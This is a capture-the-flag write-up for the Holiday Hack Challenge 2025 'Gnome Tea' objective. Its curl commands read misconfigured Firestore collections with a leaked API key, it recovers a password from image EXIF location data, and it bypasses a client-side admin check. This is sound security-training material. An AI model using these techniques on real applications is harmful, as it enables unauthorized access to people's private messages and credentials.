|[Previous Objective: Act2 Going in Reverse](HHC_2025_Template/act2_goinginreverse_mjd.html)  |   |  [Table of Contents](HHC_2025_Template/index.html) | ![BerryDunn Logo](/images/bdlogo.svg)   | [Next Objective: Act3 Hack-a-Gnome](HHC_2025_Template/act3_frosty_snowglobe_machine_mjd.html)
| :----------------------- | :--------------------------------: | :--------------------------------: |:--------------------------------: | --------------------------------: |

| Objective: Gnome Tea    | Difficulty Level: 3 |
| :-----------------------: | :--------------------------: |
| Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase. | Location: Apartment Building  |

## Solution Overview

Starting with only public access to the web application, reconnaisance was conducted to identify weaknesses. A comment was found in the page code that indicated some collections may allow insecure access. Probing those collections identified a clue to a user's password that would lead to the password. The username was identified in a collection. The password was decoded from  the latitude and longitude data contained in the image metadata. Once logged into the application as the user, code that determined if a user should have admin access was identified and abused, resulting in identifing the secret passphrase.

| Activity           | Primary Tactic | MITRE ATT&CK Technique ID             | MITRE ATT&CK Technique Name |
| :-----------------------: | :--------------------------------: | :-----------------------: | :--------------------------------: |
| Developer information disclosure | Reconnaissance | T1593 | Search Open Websites |
| Found commented code | Reconnaissance | T1595.002 | Vulnerability Scanning |
| Gain access to web application: Leak Sensitive Information | Reconnaissance | T1589 | Gather Victim Identity Information |
| Gain admin access to application | Privilege Escalation | T1548 | Abuse elevation control mechanism |


## Detailed Solution
<details>
<summary>Click to expand</summary>

Using Edge's developer tools, the application code is reviewed. An interesting comment is found on the page:
  
![Interesting Comment](/images/gnometea_interestingcomment.jpg) 

The API key is part of the URL:

https://holidayhack2025.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&appName=%5BDEFAULT%5D&v=11.10.0&eid=p&usegapi=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.W5qDlPExdtA.O%2Fd%3D1%2Frs%3DAHpOoo8JInlRP_yLzwScb00AozrrUS6gJg%2Fm%3D__features__

apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Using Burp, the configuration is retreived:

const OP={apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayhack2025.firebaseapp.com",projectId:"holidayhack2025",storageBucket:"holidayhack2025.firebasestorage.app",messagingSenderId:"341227752777",appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"},

Following the comment in the page code, let's see what collections are accessible:

curl -X GET \
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains messages, gnome names, and sender UIDS

curl -X GET \
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains avatars, authids, 

curl -X GET \
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains email addresses, notes and jpeg pictures

Looking in the dms collection contains a lot of messages. Searching for the string "password" reveals that Barnaby's image file contains location data that will identify his password.

curl -X GET \
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"

![Password Hint](/images/gnometea_passwordhint.jpg) 

Searching the gnomes collection reveals Barnabies email address. This is needed for login.

![Barnaby's Username](/images/gnometea_username.jpg) 

**Username: barnabybriefcase@gnomemail.dosis**

The correct URL to obtain Barnaby's image is: https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg

curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o drivers_license.jpeg

![Image Exifdata](/images/gnometea_exifdata.jpg) 

The image was taken at: 33 deg 27' 53.85" S, 115 deg 54' 37.62" E

Converting the Latitude and Longitude into a format for Google Maps:

https://www.google.com/maps?q=-33.464958,115.910450

![Barnaby's Password](/images/gnometea_password.jpg) 

With valid credentials, login is achieved as Barnaby.

![Gnome Tea Login](/images/gnometea_login.jpg) 

Following the hint about client side controls, the source code now available is reviewed, and admin access is hard coded into the source.

```javascript
    const [r,e] = K.useState({
        totalGnomes: 0,
        totalTea: 0,
        totalDMs: 0
    })
      , [t,s] = K.useState(!0)
      , [o,l] = K.useState(null)
      , [h,f] = K.useState(!1)
      , [m,v] = K.useState(!1)
      , {user: _} = _l()
      , T = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
    typeof window < "u" && (window.EXPECTED_ADMIN_UID = T),

```

Using the console in Edge's developer tools, admin access is achieved by setting T to 3loaihgxP0VwCTKmkHHFLe6FZ4m2

![Gnome Tea Solution](/images/gnometea_solution.jpg) 

**Answer: GigGigglesGiggler**

</details>

## Tools Reference

| Tools Used           | Tool Version |
| :-----------------------: | :--------------------------------: |
| BurpSuite | 2024.11.2 |
| exiftool | N/A | 
| Google Earth | N/A |
| Edge Developer Tools | Version 142.0.3595.94 | 

## Hints Reference
| Provided By         | Hint |
| :-----------------------: | :--------------------------------: |
| Santa  | License: Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken. |
| Santa | GnomeTea: I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services. |
| Santa | Statistically Coded: Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls. |
| Santa | Rules: Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages. |
| CraHan | Say, you wouldn't happen to have time to help me out with something? The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away. I know they've been using GnomeTea to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is. I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects. |

## Acknowledgements
| Provided By         | Notes |
| :-----------------------: | :--------------------------------: |
| Eucrates | Introduced me to Claude.ai |


|[Previous Objective: Act2 Going in Reverse](HHC_2025_Template/act2_goinginreverse_mjd.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [Next Objective: Act3 Hack-a-Gnome](HHC_2025_Template/act3_frosty_snowglobe_machine_mjd.html)
